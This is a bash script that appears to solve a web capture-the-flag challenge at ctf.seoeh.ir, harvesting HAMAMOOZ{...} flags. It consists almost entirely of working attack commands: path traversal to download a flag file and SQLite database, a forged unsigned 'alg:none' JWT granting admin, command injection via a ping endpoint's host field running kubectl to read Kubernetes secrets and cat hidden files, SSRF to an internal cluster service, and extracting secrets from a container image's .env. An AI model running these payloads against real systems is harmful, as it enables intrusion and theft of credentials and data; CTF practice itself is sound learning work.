#!/bin/bash
curl -s https://ctf.seoeh.ir/swagger.json | grep -o 'HAMAMOOZ{[^}]*}'


curl -s https://ctf.seoeh.ir/api/internal/flag -H "X-Debug-Mode: true" | grep -o 'HAMAMOOZ{[^}]*}'


curl -s "https://ctf.seoeh.ir/api/reports/download?file=../flag.txt"


curl -s "https://ctf.seoeh.ir/api/reports/download?file=../db/db.sqlite3" -o db.sqlite3 &&
strings db.sqlite3 | grep -oE 'HAMAMOOZ\{[^}]+\}'


ADMIN_TOKEN=$(python3 -c 'import base64,json; b=lambda o: base64.urlsafe_b64encode(json.dumps(o,separators=(",",":")).encode()).rstrip(b"=").decode(); print(b({"alg":"none","typ":"JWT"})+"."+b({"sub":"47","username":"test1","org":"Acme Corp","role":"admin"})+".")') && \
curl -s https://ctf.seoeh.ir/admin/dashboard \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  |grep -o 'HAMAMOOZ{[^}]*}'


curl -s -X POST https://ctf.seoeh.ir/api/diag/ping \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; kubectl get secret flag-secret -n ctf-secrets -o jsonpath=\"{.data.flag}\" | base64 -d; #"}' \
  |grep -o 'HAMAMOOZ{[^}]*}'


curl -s -X POST https://ctf.seoeh.ir/api/diag/ping \
  -H "Content-Type: application/json" \
  -d '{"host":"example.com; kubectl get pod legacy-worker -n escape-zone -o yaml; #"}' \
  | grep -o 'HAMAMOOZ{[^}]*}' \
  | head -n 1


curl -s -X POST https://ctf.seoeh.ir/api/diag/ping \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; cat /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt; #"}' \
  | grep -o 'HAMAMOOZ{[^}]*}'


curl -s -X POST https://ctf.seoeh.ir/api/webhooks/test \
-H "Content-Type: application/json" \
-d '{"url":"http://admin-panel.internal-tools.svc.cluster.local","method":"GET"}' | grep -o 'HAMAMOOZ{[^}]*}'


skopeo copy docker://hub.hamdocker.ir/seoeh/hamamooz_challlenges:backend dir:./skopeo_out > /dev/null 2>&1
mkdir -p env_layer
tar -xzf skopeo_out/cad298f9538d92ea9901f8de6c41611a63d62c56e914c9bd802ff01080456041 -C env_layer 2>/dev/null
grep -o 'HAMAMOOZ{[^}]*}' env_layer/app/.env